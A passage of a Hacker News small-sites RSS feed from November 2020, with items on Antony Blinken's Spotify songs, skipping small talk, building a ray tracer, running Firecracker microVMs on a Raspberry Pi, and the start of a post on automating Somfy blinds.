<![CDATA[Biden's Secretary of State nominee is a part-time rock star with a Spotify page]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25188375">thread link</a>) | @Bologo
<br/>
November 23, 2020 | https://www.psychnewsdaily.com/antony-blinken-music-what-do-his-spotify-songs-say-about-foreign-policy/ | <a href="https://web.archive.org/web/*/https://www.psychnewsdaily.com/antony-blinken-music-what-do-his-spotify-songs-say-about-foreign-policy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-5141" role="main"><div><div><div><p>Is Antony Blinken music about to blow up on Spotify?</p><p>As you may have heard, <a href="https://www.theguardian.com/us-news/2020/nov/23/joe-biden-to-nominate-antony-blinken-as-us-secretary-of-state" target="_blank" rel="noreferrer noopener">Joe Biden plans to nominate</a> career diplomat Antony Blinken as his Secretary of State.</p><p>But did you also know that Antony Blinken is a musician with songs on Spotify? With a blue “Verified Artist” checkmark to boot? One YouTube commenter has <a href="https://youtu.be/bqb7AQ3u2x8" target="_blank" rel="noreferrer noopener">aptly dubbed him the Secretary of Shred</a>, while on Reddit he’s <a href="https://www.reddit.com/r/Guitar/comments/jzkv92/news_joe_bidens_secretary_of_state_nominee_antony/" target="_blank" rel="noreferrer noopener">Blinken Park</a>.</p><h2>Antony Blinken songs on Spotify</h2><p>Blinken records under the name <a href="https://open.spotify.com/artist/5ZWgy4Riyzr0QtvcIKiZmF?si=gAnTYlrYREiWiGULbt605g" target="_blank" rel="noreferrer noopener">Ablinken</a>. Is this a pun on <a href="https://amzn.to/2J0pVbq" target="_blank" rel="noreferrer noopener">POTUS #16</a>? Or perhaps even a revelation of his own presidential ambitions?</p><p>In any case, Antony “Ablinken” Blinken currently has two songs on Spotify, both of which are singles from 2018. <span data-ez-name="psychnewsdaily_com-medrectangle-4"></span></p><p>He also has 53 monthly listeners (as of this writing); not quite as many as <a href="https://open.spotify.com/artist/6eUKZXaKkcviH0Ku9w2n3V" target="_blank" rel="noreferrer noopener">Ed Sheeran’s 50 million</a>, but more than many of Spotify’s other 3 million “creators.”</p><p><a href="https://open.spotify.com/artist/5ZWgy4Riyzr0QtvcIKiZmF?si=gAnTYlrYREiWiGULbt605g" target="_blank" rel="noreferrer noopener">Blinken’s Spotify page</a> also refers to “contributions from Alex Chilton,” though the nature of those contributions remains unclear. Likewise, he writes that he plays in a “charity concert band” called Coalition of the Willing, whose members include “Jeff ‘Skunk’ Baxter of Steely Dan and Doobie Brothers acclaim.” Not the worst of musical companions.</p><h3>Song #1: Lip Service</h3><p>The first song, <em>Lip Service</em>, is a four-minute 80s rocker.</p><figure><div></div></figure><p>It begins with intricate acoustic guitar textures teasing out a (too?) familiar descending-chromatic melody, with some delicate Latin percussion in the background. <span data-ez-name="psychnewsdaily_com-box-4"></span></p><p>It soon becomes a different song altogether: standard rock-guitar fare that could have been heard onstage in any bar in any town around 1985.</p><p>Throughout the song, <em>Lip Service</em> features earnest but generic vocals that bring to mind the late Eddie Money. The chromatic descending guitar bit from the intro returns at about 3:30, now serving as a backdrop for some serviceable solo-guitar noodling.</p><p>This solo dominiates the longish fade-out, during which the bass line anxiously scurries up the frets in an effort to be heard amid the many guitars, with the drums also becoming increasingly excitable. All in all, it sounds like they had fun recording it.</p><h3>Song #2: Patience</h3><p>The second song, <em>Patience</em>, is a more ballady three-and-half minute number.</p><figure><div></div></figure><p><em>Patience</em> also begins with an acoustic guitar pattern, reminiscent of the <a rel="noreferrer noopener" href="https://youtu.be/ErvgV4P6Fzc" target="_blank">Guns N’ Roses song that shares the same name</a>, as well as Extreme’s <em>More than Words</em>. The vocal style of our next SecState unironically recalls Flight of the Conchords’ Jemaine Clement during a <a href="https://youtu.be/9jLDZjMF3tk" target="_blank" rel="noreferrer noopener">moment of peak emotionality</a>. The song also feature some jaunty piano and an unexpected recorder solo. Yes, that’s the same instrument you <a rel="noreferrer noopener" href="https://www.atlasobscura.com/articles/why-every-kid-in-america-learns-to-play-the-recorder" target="_blank">had to take lesson on in third grade</a>.</p><h2>Policy clues in Antony Blinken songs: <strong>riddles wrapped in myste</strong>ries&nbsp;inside a<strong> middle 8</strong>?</h2><p>Does Antony Blinken music tell us anything about Antony Blinken doctrine?</p><p>“So give me just a chance to let you feel what I feel,” Blinken delicately begs us in <em>Patience</em>. Could this sensitive appeal augur a kindler and gentler foreign policy going forward?</p><p>Alternately, what are we to make of the Biden nominee crooning “Help me now, ’cause patience is dying”? This may suggest a hawkish and <a rel="noreferrer noopener" href="https://www.psychnewsdaily.com/analysis-of-trumps-tweets-show-hes-sleeping-less-and-getting-angrier/" target="_blank">easily exasperated statesman</a> with an itchy trigger finger, the type who might <a rel="noreferrer noopener" href="https://youtu.be/Fc22CFhDBEM" target="_blank">write an angry letter</a> at the drop of a hat.</p><p>In any case, untangling the implicit policies behind “Patience is talking til I’m blue, when all I want, I want to unfold you” will be a matter for tomorrow’s historians. And we all can look forward to overly-long analyses of The Great Unfolding on The New York Times op-ed pages beginning in January of 2021.</p><p>But in the meantime, we’ll have to make due with a pair of inoffensive AOR lite-rock songs that take us back to a simpler age.</p><hr><p><strong>Photo: credit</strong> U.S. Embassy Tokyo / Public Domain, via <a href="https://www.flickr.com/photos/usembassytokyo/21334927593/" target="_blank" rel="noreferrer noopener">Flickr</a></p><p>For a weekly summary of the latest psychology news, subscribe to our <a href="https://www.psychnewsdaily.com/the-psych-news-weekly-newsletter/" target="_blank" rel="noreferrer noopener">Psych News Weekly newsletter</a>.</p></div></div></div></article></div>]]>
            </description>
            <link>https://www.psychnewsdaily.com/antony-blinken-music-what-do-his-spotify-songs-say-about-foreign-policy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25188375</guid>
            <pubDate>Mon, 23 Nov 2020 16:23:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Death to Small Talk]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25188185">thread link</a>) | @mcrittenden
<br/>
November 23, 2020 | https://critter.blog/2020/11/23/death-to-small-talk/ | <a href="https://web.archive.org/web/*/https://critter.blog/2020/11/23/death-to-small-talk/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-content" role="main">

	
<article id="post-3383">

	
<!-- .entry-header -->

	<div>

		<div>

			
<p>Most human interaction is a combination of canned responses. </p>



<p>Does anyone enjoy small talk? Are there people who look forward to talking about the weather and asking about each other’s weekend plans? Why is that the default? </p>



<p>Everyone appreciates an authentic moment. A chance to really see another person…does it get any better than that? So why is it so hard to be authentic? Why does society expect us to waste so many words talking on-script? </p>



<p>We appreciate authenticity, but we’re scared to show it ourselves. How can we break past this cognitive dissonance?</p>



<p>A lot of my lifelong incorrect <a href="https://critter.blog/2020/10/27/am-i-an-extrovert-or-an-introvert/">belief that I was an introvert</a> boils down to the fact that I hate small talk. I suck at it, first of all. And it’s boring. I assumed that my hatred of small talk meant that I was an introvert. It didn’t occur to me until recently that small talk is not required.</p>



<p>So lately, I’ve been experimenting with skipping past small talk and diving right into big talk. A few examples:</p>



<ul><li>In a casual work chat, after saying hi, I skipped the next 10 minutes of canned small talk. I jumped straight into a tough question about how he has stayed sane in the same role (CEO) for 20 years, with no boss and no growth path. He rolled with it without missing a beat. We went deep for 30 minutes on what it means to have a boss and how there are different types of growth. It was amazing.</li><li>A neighbor and I ended up at the same spot at the same time. I knew that she was taking a break from her teaching job during the pandemic. So after saying hi, I asked her if she’s been missing teaching and the meaning that brings to her days. She lit up and I got to know her in a way that 7+ years of neighborly chit chat has never allowed.</li><li>A relative was at our house a last week. Usually, we’d chat for only a couple minutes about surface level “how’s work going?” type stuff. This time, I asked him why he has stayed with the same company for 40 years and if he’s ever wanted to leave. He was so excited to tell me about his career and why he’s avoided managerial roles and why he’s considering leaving now after all this time. This is a guy I’ve seen weekly for 15 years, and we had never made it past the canned interactions until now. </li></ul>



<p>Powerful things are happening in my life when I go off-script. I’m finally seeing people authentically that I’ve “known” for years. </p>



<p>I wish I had realized decades ago that small talk is not only optional, but toxic. </p>





		</div><!-- .entry-content -->

	</div><!-- .post-inner -->

	<!-- .section-inner -->

	
	<!-- .pagination-single -->

	
</article><!-- .post -->

</div></div>]]>
            </description>
            <link>https://critter.blog/2020/11/23/death-to-small-talk/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25188185</guid>
            <pubDate>Mon, 23 Nov 2020 16:05:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How I Made a Ray Tracer]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25188131">thread link</a>) | @rex64
<br/>
November 23, 2020 | https://alessandrocuzzocrea.com/how-i-made-a-ray-tracer/ | <a href="https://web.archive.org/web/*/https://alessandrocuzzocrea.com/how-i-made-a-ray-tracer/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="article-content"><h2 id="intro">Intro</h2>
<p><img src="https://alessandrocuzzocrea.com/how-i-made-a-ray-tracer/ray-tracer-final-render.jpg" alt="Ray tracer final render" width="1440" height="810" loading="lazy">
</p>

<p>Starting this year, I decided to dedicate some of my spare time to a few personal projects I never got around to actually doing due to various circumstances.</p>
<p>The goal of this particular project is to be able to create a simple ray tracer software tool that will be able to produce some cool images.</p>
<p><a href="https://en.wikipedia.org/wiki/Ray_tracing_(graphics)">Ray tracing</a> is a technique used to generate a two-dimensional image from a tri-dimensional model, and a ray tracer is a piece of software that performs ray-tracing calculations.</p>
<p>Ray tracing as a whole is getting more and more popular these days, as consumer <a href="https://en.wikipedia.org/wiki/Video_card">graphics cards</a> have gained the ability to do real-time ray tracing to increase image quality.</p>
<p>I’m going to present to you the process that brought me from zero to creating a ray tracer completely from scratch.</p>
<h2 id="personal-projects">Personal Projects</h2>
<p>The idea for this project actually came to me last year.</p>
<p>I was talking to a friend who at that time was making a <a href="https://en.wikipedia.org/wiki/PlayStation_(console)">PS1</a> <a href="https://en.wikipedia.org/wiki/Emulator">emulator</a>.
We were talking about cool stuff like implementing a graphical pipeline in software (basically rendering an image without asking for any help from the <a href="https://en.wikipedia.org/wiki/Graphics_processing_unit">GPU</a>).</p>
<p>That discussion reminded me of the time I made a ray tracer back in the day (I bet it’s still on my old <a href="https://en.wikipedia.org/wiki/IMac_G4">iMac G4</a> hard drive).
I remember it was pretty crazy but I never got around to experimenting more with it.</p>
<p>Wouldn’t it be cool, I thought, to make another ray tracer as a personal project?</p>
<p>I went on and started coding on a whim.
Unfortunately, I was busy with other matters so I had to stop working on the project after a few commits.</p>
<p>Almost a whole year passed and the project was still lingering on my <a href="https://github.com/alessandrocuzzocrea">GitHub account</a> with only a few commits to it, so I decided to give it another chance.</p>
<p>This time, I’m going to proceed in a more structured fashion.
I find that I’m more likely to abandon a project if I jump into it without planning first.</p>
<p>Also, to make this a more effective learning experience, I’m going to tackle this project from first principle, meaning I have to study and fully comprehend the theory underlying ray tracing.</p>
<p>I’m reserving four months (from June to September) to bring the project to a conclusion.
Four months should be plenty of time to explore the subject while still short enough to avoid procrastinating.</p>
<h2 id="before-starting-out">Before Starting Out</h2>
<p>There are tons of tutorials and books out there on how to build a ray tracer, but in the past, I sometimes tried using resources like those <em>paint by numbers</em>-style books because they usually skip explaining the math and go straight to the code.
However, if you don’t understand what makes the ray tracer tick, you’re basically just copy-pasting the code without fully grasping it.
I could have used those as a reference, but since I already wrote a ray tracer a couple of years ago, I wanted to go more in-depth this time.</p>
<p>I would start from the math behind it.</p>
<p>I remember studying linear algebra when I was first starting out in computer graphics (mainly <a href="https://en.wikipedia.org/wiki/OpenGL">OpenGL</a> <a href="https://en.wikipedia.org/wiki/Fixed-function">fixed-function pipeline</a>) ages ago, so naturally, I thought that was a good starting point.
I just needed to give myself a good refresher on the subject.</p>
<p>Searching online, I found this awesome free textbook called – yes, you guessed it – <a href="https://hefferon.net/linearalgebra/">Linear Algebra</a> by <a href="https://hefferon.net/">Jim Hefferon</a>, Professor of Mathematics at <a href="https://en.wikipedia.org/wiki/Saint_Michael%27s_College">Saint Michael’s College</a>.
The textbook is free to download.
Also available on the website is the LaTeX source, solutions to all the exercises, classroom slides, and a series of video lectures.</p>
<p>The second book I used is called <a href="https://books.google.com/books?id=YPblYyLqBM4C&amp;lpg=PP1&amp;dq=isbn:9780122861604&amp;pg=PP1&amp;redir_esc=y">An Introduction to Ray Tracing</a>.
It’s a classic book on the subject and while a lot of the techniques contained in it are kinda outdated, they’re still fundamental to understand the basics of ray tracing.
I bought this book in physical form ages ago and I remember it was really easy to follow and understand.
This book is likewise <a href="https://www.realtimerendering.com/raytracing/An-Introduction-to-Ray-Tracing-The-Morgan-Kaufmann-Series-in-Computer-Graphics-.pdf">available for free</a>.</p>
<h2 id="the-application">The Application</h2>
<p>For learning projects like this, I’m always keen to make something that will be able to run in a web browser instead of a native application – the reason being that if the project runs in the browser, there’s less friction when I want to share or show it to somebody like a prospective employer.</p>
<p>Unless a side-project requires a specific feature that only a native app can have access to, I always try to settle for a web app.
The only problem is that any modern web project usually requires you to use <a href="https://en.wikipedia.org/wiki/JavaScript">JavaScript</a> and the <a href="https://en.wikipedia.org/wiki/Node.js">Node.js</a> ecosystem.
While I don’t mind Node, I’m not the biggest fan of JavaScript.
Don’t get me wrong, it’s a fine programming language, but I’m personally more productive using languages that support <a href="https://en.wikipedia.org/wiki/Type_system#Static_type_checking">static type checking</a>.</p>
<p>And here’s where <a href="https://en.wikipedia.org/wiki/TypeScript">TypeScript</a> comes to the rescue!
TypeScript is a programming language that <a href="https://en.wikipedia.org/wiki/Source-to-source_compiler">transpiles</a> to JavaScript.
TypeScript was developed to get around JavaScript’s shortcomings by adding support for optional static typing, which is why I chose it for this project.</p>
<h2 id="studying-linear-algebra">Studying <em>Linear Algebra</em></h2>
<p>Linear algebra is a broad subject.</p>
<p>I ended up studying the whole book, learning a lot of interesting topics that I would have never come across if I was only looking up at the math needed for ray tracing.
The book also presents some linear algebra real-world applications at the end of every chapter.
It really helps ground what you’re studying into reality.</p>
<p>Overall, I really enjoyed this book.
Working out proofs and exercises was more fun than I remembered from back in school.</p>
<h2 id="studying-an-introduction-to-ray-tracing">Studying <em>An Introduction to Ray Tracing</em></h2>
<p>I started studying <em>An Introduction to Ray Tracing</em> immediately after I finished <em>Linear Algebra</em>.</p>
<p>The book opens with a comprehensive introduction to ray tracing.</p>
<p>Various illustrations accompany the introduction to help the reader visualize the process.
Ray tracing is a visual matter, so having it explained in both text and visual form is great.
I found myself relying more on those rather than the written explanations.</p>
<p>After the introduction, we enter one of the most important chapters of the book.
Appropriately titled <em>Essential Ray Tracing Algorithms</em>, the chapter discuss the fundamental operation of calculating where our rays will intersect with the objects of our scenes, which, if you think about it, is what classic ray tracing is all about.</p>
<h2 id="taking-notes">Taking Notes</h2>
<p>I did all my writing on paper.</p>
<p>Writing on paper really helps me concentrate.
There’s just less friction that way.
With the computer, the next distraction is always only a new tab away.
I also feel that when I write stuff down on paper, I have an easier time recalling information later.</p>
<p>I remember reading some research that showed that writing by hand helps people remember better and learn more efficiently.
The brain supposedly gets more stimulated and less distracted when writing with a pen/pencil rather than just typing on a keyboard.
This helps to form long-term memory.</p>
<p>I also find that I tend to review my paper notes more over digital ones.
Having something physical on your desk always there reminding you of your progress is better than having something in some <a href="https://en.wikipedia.org/wiki/Text_file">text file</a> that you write once and then forget about.
I know this because, over the years, I’ve accumulated tons of now-forgotten memos all over the place, spanning a multitude of devices and cloud services.</p>
<h2 id="reviewing-what-ive-learned">Reviewing What I’ve Learned</h2>
<p>As I was finishing each chapter, I wrote down all the interesting explanations and definitions on flashcards.
I know that flashcards and SRS are a controversial topic in the learning community, but I’ve been using those tools for a long time now and they’ve always served me well.
Yes, creating and reviewing the cards is extremely time-consuming, but I think it’s worth the time investment.
I find it especially helpful for memorizing definitions.</p>
<p>Repetition is key to make something stick.</p>
<p>Repetition is a simple way to keep knowledge fresh.
<a href="https://en.wikipedia.org/wiki/Spaced_repetition">Spaced repetition</a> software uses repetition to help you review your cards.
The more you get a card’s answer right, the less frequently the card is shown.</p>
<p><a href="https://en.wikipedia.org/wiki/Anki_(software)">Anki</a> is my SRS of choice.
I’ve been using it for a long time now and have accumulated quite a few  flashcards on my Anki account.
The software is quite straightforward to use.
For example, I have cards that ask me to demonstrate a theorem.
After I finish my answer (which I write rigorously by hand because, as I said before, doing so helps me jog my memory), I compare my answer against the one written on the back of the card.
Then it’s time to rate my answer.
I can choose between <em>Easy</em>, <em>Good</em>, or <em>Again</em> depending on how difficult answering the card was.
When you select <em>Again</em>, Anki will flag your answer as incorrect and show you those cards more frequently to help you memorize them.</p>
<h2 id="the-ray-tracing-algorithm">The Ray Tracing Algorithm</h2>
<p>This is the heart of any ray tracer – the sweet intersection between math and code that makes everything tick.</p>
<p>When people explain ray tracing, they usually make an analogy about how real-world cameras work.</p>
<p><a href="https://en.wikipedia.org/wiki/Ray_(optics)">Rays of light</a> from the environment enter the camera from the lens and hit the <a href="https://en.wikipedia.org/wiki/Image_sensor">sensor</a> (or a piece of <a href="https://en.wikipedia.org/wiki/Photographic_film">film</a> in the case of an analog one) in the back of the camera.
The sensor then captures the color of the light and the camera produces the final image file.</p>
<figure>
    
    <img src="https://alessandrocuzzocrea.com/how-i-made-a-ray-tracer/a-ray-of-light-reflecting-off-an-object-and-reaching-the-sensor-inside-the-camera.jpg" alt="A ray of light reflecting off an object and reaching the sensor inside the camera" width="1440" height="810" loading="lazy">


    <figcaption>A ray of light reflecting off an object and reaching the sensor inside the camera</figcaption>
</figure>

<p>Ray tracing works almost the same way as a real-life camera, only instead of a sensor, we have an <a href="https://en.wikipedia.org/wiki/Image_plane">image plane</a>.</p>
<p>The image plane of a ray tracer works a lot like the sensor of a camera.
Basically, ray tracers create images by determining what color to fill each pixel on the image plane.
For example, if there’s a blue sphere in the center of the scene, the corresponding pixel on the image plane will also be colored blue.</p>
<p>But how will the ray tracer know what color to fill in those pixels?
After all, there’s no real light in our 3D scene – it’s just a bunch of data.
Here’s where the ingenious intuition of ray tracing comes into play.
We can use the same principle that makes a real-world camera work and simulate the rays of lights.</p>
<p>We start by generating a ray from the point of view (also called eye or camera) to the center of each pixel of the image plane.</p>
<p>Rays may or may not intersect …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://alessandrocuzzocrea.com/how-i-made-a-ray-tracer/">https://alessandrocuzzocrea.com/how-i-made-a-ray-tracer/</a></em></p>]]>
            </description>
            <link>https://alessandrocuzzocrea.com/how-i-made-a-ray-tracer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25188131</guid>
            <pubDate>Mon, 23 Nov 2020 16:01:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Getting Started with Firecracker on Raspberry Pi]]>
            </title>
            <description>
<![CDATA[
Score 83 | Comments 25 (<a href="https://news.ycombinator.com/item?id=25187965">thread link</a>) | @sairamkunala
<br/>
November 23, 2020 | https://dev.l1x.be/posts/2020/11/22/getting-started-with-firecracker-on-raspberry-pi/ | <a href="https://web.archive.org/web/*/https://dev.l1x.be/posts/2020/11/22/getting-started-with-firecracker-on-raspberry-pi/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2 id="abstract">Abstract</h2><p>Traditionally services were deployed on bare metal and in the last decades we have seen the rise of virtualisation (running additional operating systems in a operating system process) and lately containerisation (running an operating system process in a separate security context from the rest of processes on the same host). Virtualisation and containerisation offers different levels of isolation by moving some operating system functionality to the guest systems.</p><p>The following chart illustrates that pretty well:</p><p><img src="https://dev.l1x.be/img/isolation.png" alt="OS functionality location"></p><p>Source: <a href="https://research.cs.wisc.edu/multifacet/papers/vee20_blending.pdf">https://research.cs.wisc.edu/multifacet/papers/vee20_blending.pdf</a></p><p>In this article, I perform a deep dive into Firecracker and how it can be used for deploying services on Raspberry Pi (4B).</p><h2 id="getting-started">Getting started</h2><p>There are few paths to take here. First I am going to try the easy one, using Ubuntu. Later on we can investigate the use of Alpine Linux which is much more lightweight than Ubuntu, ideal for devices like RPI.</p><h3 id="installing-the-image-on-a-microsd-card">Installing the image on a microSD card</h3><p>We need a 64 bit Ubuntu image and a microsd card. For the imaging I use <a href="https://www.balena.io/etcher/">Balena Etcher</a> that makes the imaging process super easy.</p><p>Getting the pre-installed image:</p><div><pre><code data-lang="bash">wget https://cdimage.ubuntu.com/releases/20.04/release/<span>\
</span><span></span>ubuntu-20.04.1-preinstalled-server-arm64+raspi.img.xz
</code></pre></div><p>Preinstalled means that we get a fully working operating system and there is no need for additional installation steps after booting up. With Balena Etcher it is super easy to write the compressed image file to the sd card and boot the system up once ready. SSHD starts up after the installation and we can log in via ssh if we know the IP address that the DHCP server issues to our device (assuming DHCP server is present in our LAN).</p><p>There are few mildly annoying things with Ubuntu (snaps, unattended-upgrades) that I usually remove. I also prefer to use Chrony over the systemd equivalent. Ansible repo for these is available here: <a href="https://github.com/l1x/rpi/blob/main/ubuntu.20/ansible/roles/os/tasks/main.yml">https://github.com/l1x/rpi/blob/main/ubuntu.20/ansible/roles/os/tasks/main.yml</a></p><h3 id="installing-firecracker-jailer-and-firectl">Installing Firecracker, Jailer and Firectl</h3><ul><li>Firecracker: The main component, it is a virtual machine monitor (VMM) that uses the Linux Kernel Virtual Machine (KVM) to create and run microVMs.</li><li>Jailer: For starting Firecracker in production mode, applies a cgroup/namespace isolation barrier and then drops privileges. There</li><li>Firectl: A command line utility for convenience</li></ul><h4 id="getting-firecracker-and-jailer">Getting Firecracker and Jailer</h4><p>For the first two it is possible to download the release binaries from Github.</p><div><pre><code data-lang="bash"><span>version</span><span>=</span><span>'v0.23.0'</span>

wget https://github.com/firecracker-microvm/firecracker/<span>\
</span><span></span>releases/download/<span>${</span><span>version</span><span>}</span>/firecracker-<span>${</span><span>version</span><span>}</span>-aarch64
wget https://github.com/firecracker-microvm/firecracker/<span>\
</span><span></span>releases/download/<span>${</span><span>version</span><span>}</span>/jailer-<span>${</span><span>version</span><span>}</span>-aarch64

mv firecracker-<span>${</span><span>version</span><span>}</span>-aarch64 firecracker
mv jailer-<span>${</span><span>version</span><span>}</span>-aarch64 jailer

chmod +x firecracker jailer

./firecracker --help
./jailer --help
</code></pre></div><h4 id="firectl">Firectl</h4><p>Firectl is a bit trickier to install because there is no release binary and it requires Golang 1.14 to compile. We can do these in two steps.</p><div><pre><code data-lang="bash">wget https://golang.org/dl/go1.14.12.linux-arm64.tar.gz
tar xzvf go1.14.12.linux-arm64.tar.gz
</code></pre></div><p>After getting go we can get the source of firectl and compile it:</p><div><pre><code data-lang="bash">git clone https://github.com/firecracker-microvm/firectl.git
<span>cd</span> firectl/
 ~/go/bin/go build -x
</code></pre></div><p>Testing Firectl:</p><p>We have all the tools we need for running our first microVM the only thing is missing: something to run.</p><h3 id="downloading-our-first-image">Downloading our first image</h3><p>For a microVM there are two things necessary to have:</p><ul><li>an uncompressed linux kernel (vmlinux)</li><li>a filesystem</li></ul><p>Later on we are going to investigate how we could create our own version of these, but for now we are going to use images from</p><div><pre><code data-lang="bash">wget https://s3.amazonaws.com/spec.ccfc.min/<span>\
</span><span></span>img/aarch64/ubuntu_with_ssh/kernel/vmlinux.bin
wget https://s3.amazonaws.com/spec.ccfc.min/<span>\
</span><span></span>img/aarch64/ubuntu_with_ssh/fsfiles/xenial.rootfs.ext4
</code></pre></div><h3 id="configuring-network">Configuring network</h3><p>For the microVM to function properly we need a networking device. For this scenario we are going to use tap and create a device:</p><div><pre><code data-lang="bash">sudo ip tuntap add dev tap0 mode tap
sudo ip addr add 172.16.0.1/24 dev tap0
sudo ip link <span>set</span> tap0 up
ip addr show dev tap0
</code></pre></div><p>If we want to give access to our VM we have to enable IP forwarding:</p><div><pre><code data-lang="bash"><span>DEVICE_NAME</span><span>=</span>eth0
sudo sh -c <span>"echo 1 &gt; /proc/sys/net/ipv4/ip_forward"</span>
sudo iptables -t nat -A POSTROUTING -o <span>$DEVICE_NAME</span> -j MASQUERADE
sudo iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
sudo iptables -A FORWARD -i tap0 -o <span>$DEVICE_NAME</span> -j ACCEPT
</code></pre></div><h3 id="running-our-first-microvm">Running our first microVM</h3><p>This is how we can start up our first microVM. I usually start it in screen so I can open a new session easily because it will use the standard input and output for the newly started of console (unless you redirect it).</p><p>This is for debug mode, starting with sudo:</p><div><pre><code data-lang="bash">sudo ./firectl/firectl <span>\
</span><span></span>--firecracker-binary<span>=</span>./firecracker <span>\
</span><span></span>--kernel<span>=</span>vmlinux.bin <span>\
</span><span></span>--tap-device<span>=</span>tap0/aa:fc:00:00:00:01 <span>\
</span><span></span>--kernel-opts<span>=</span><span>\
</span><span></span><span>"console=ttyS0 reboot=k panic=1 pci=off \
</span><span>ip=172.16.0.42::172.16.0.1:255.255.255.0::eth0:off"</span> <span>\
</span><span></span>--root-drive<span>=</span>./xenial.rootfs.ext4
</code></pre></div><p>If everything went well you can see something like this:</p><pre><code>Ubuntu 18.04.2 LTS fadfdd4af58a ttyS0

fadfdd4af58a login:
</code></pre><p>User and password is root:root.</p><h3 id="testing-networking">Testing networking</h3><p>For this we need to have a bit bigger image.</p><div><pre><code data-lang="bash">dd <span>if</span><span>=</span>/dev/zero <span>bs</span><span>=</span>1M <span>count</span><span>=</span><span>800</span> &gt;&gt; xenial.rootfs.ext4
resize2fs -f xenial.rootfs.ext4
</code></pre></div><p>After starting up the usual way and logging in we need to fix few things:</p><p>Adding some working nameserver:</p><div><pre><code data-lang="bash"><span>echo</span> <span>'nameserver 1.1.1.1'</span> &gt;  /etc/resolv.conf
</code></pre></div><p>Now trying to update:</p><div><pre><code data-lang="bash">root@fadfdd4af58a:~# apt update
Get:1 http://ports.ubuntu.com/ubuntu-ports bionic InRelease <span>[</span><span>242</span> kB<span>]</span>
Get:2 http://ports.ubuntu.com/ubuntu-ports bionic-updates InRelease <span>[</span>88.7 kB<span>]</span>
Hit:3 http://ports.ubuntu.com/ubuntu-ports bionic-backports InRelease
Hit:4 http://ports.ubuntu.com/ubuntu-ports bionic-security InRelease
Get:5 http://ports.ubuntu.com/ubuntu-ports bionic/universe arm64 Packages <span>[</span>11.0 MB<span>]</span>
Get:6 http://ports.ubuntu.com/ubuntu-ports bionic/multiverse arm64 Packages <span>[</span><span>153</span> kB<span>]</span>
Get:7 http://ports.ubuntu.com/ubuntu-ports bionic/main arm64 Packages <span>[</span><span>1285</span> kB<span>]</span>
Get:8 http://ports.ubuntu.com/ubuntu-ports bionic/restricted arm64 Packages <span>[</span><span>572</span> B<span>]</span>
Get:9 http://ports.ubuntu.com/ubuntu-ports bionic-updates/universe arm64 Packages <span>[</span><span>1865</span> kB<span>]</span>
Get:10 http://ports.ubuntu.com/ubuntu-ports bionic-updates/restricted arm64 Packages <span>[</span><span>2262</span> B<span>]</span>
Get:11 http://ports.ubuntu.com/ubuntu-ports bionic-updates/main arm64 Packages <span>[</span><span>1431</span> kB<span>]</span>
Get:12 http://ports.ubuntu.com/ubuntu-ports bionic-updates/multiverse arm64 Packages <span>[</span><span>5758</span> B<span>]</span>
Fetched 16.1 MB in 6s <span>(</span><span>2543</span> kB/s<span>)</span>
Reading package lists... Error!
E: flAbsPath on /var/lib/dpkg/status failed - realpath <span>(</span>2: No such file or directory<span>)</span>
E: Could not open file  - open <span>(</span>2: No such file or directory<span>)</span>
E: Problem opening
E: The package lists or status file could not be parsed or opened.
</code></pre></div><p>Fixing the apt issues:</p><div><pre><code data-lang="bash">mkdir -p /var/lib/dpkg/<span>{</span>info,alternatives<span>}</span>
touch /var/lib/dpkg/status
apt install apt-utils -y
</code></pre></div><p>Enjoy!</p><p>Next time we can go through how to compile a new kernel and have a different rootfs (potentially using Alpine).</p></div></div>]]>
            </description>
            <link>https://dev.l1x.be/posts/2020/11/22/getting-started-with-firecracker-on-raspberry-pi/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25187965</guid>
            <pubDate>Mon, 23 Nov 2020 15:48:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Somfy blinds automated via MQTT and Home Assistant]]>
            </title>
            <description>
<![CDATA[
Score 30 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25187945">thread link</a>) | @ggambetta
<br/>
November 23, 2020 | https://mwitkow.me/posts/2020-11-08_somfy/ | <a href="https://web.archive.org/web/*/https://mwitkow.me/posts/2020-11-08_somfy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In this post I’ll show you how to use a Raspberry Pi and some soldering skills to automate old Somfy blinds via the MQTT protocol exposed to Home Assistant and Google Home.</p><p>We’ve moved to a new apartment and one of its features are external blinds (a.k.a. covers) that are controlled through a dedicated remote of the Somfy brand. However, just like with a TV, finding the remote is often tricky, so I decided to try and automate the external blind movements through Home Assistant and further voice commands of Google Home.</p><p>The system in place is a Somfy’s Telis 4 RTS Pure remote, with two remotes, each being able to program 5 channels (4 individual ones and combined). The system uses a legacy, proprietary radio protocol called <a href="https://service.somfy.com/downloads/nam_v4/rts_pocket_guide_dec_2017.pdf">RTS</a>, which only Somfy and Telis use.</p><p>Somfy offers a RTS bridge called <a href="https://www.somfysystems.com/en-us/products/1811403/mylink">Somfy MyLink</a> for a wooping ~300CHF, which is a little steep for something that is not necessary and just scratching an itch. Also, there’s not much fun in that.</p><p>Turns out, <a href="https://github.com/Nickduino/">Nickduino</a> had a similar itch to scratch. Using 3-4 CHF-worth of hardware components, it is quite easy to build a software radio that will immitate a Somfy Telis remote and control the blinds.</p><p>There’s an bare-bones <a 